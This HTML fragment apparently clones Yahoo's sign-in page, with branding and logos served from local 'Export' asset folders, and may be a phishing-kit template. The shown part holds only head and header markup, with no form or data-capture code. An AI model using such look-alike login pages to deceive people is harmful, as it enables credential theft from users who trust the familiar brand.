...
<html id="Stencil" class="js grid light-theme">
    <head>
        ...
        <link rel="stylesheet" href="../../Export/css/yahoo.css">
        <link rel="shortcut icon" href="../../Export/img/Yahoo/yahoo.ico" type="image/x-icon">
        <title>Yahoo</title>
        <style>
    ...
    <body>
        <div id="login-body" class="loginish puree-v2 grid ">
            <div class="mbr-desktop-hd"><span class="column"><a style="cursor: pointer;"><img src="../../Export/img/Yahoo/yahoo.png" alt="Yahoo" class="logo " width="" height="36"><img src="Yahoo_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36"></a></span>
                <span class="column help txt-align-right"><a style="cursor: pointer;">Help</a></span>
            </div>
            <div class="login-box-container">
                <div class="login-box right">
                    <div class="mbr-login-hd txt-align-center"><img src="../../Export/img/Yahoo/yahoo.png" alt="Yahoo" class="logo yahoo-en-GB" width="" height="27"><img src="Yahoo_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-GB"
                            width="" height="27"></div>
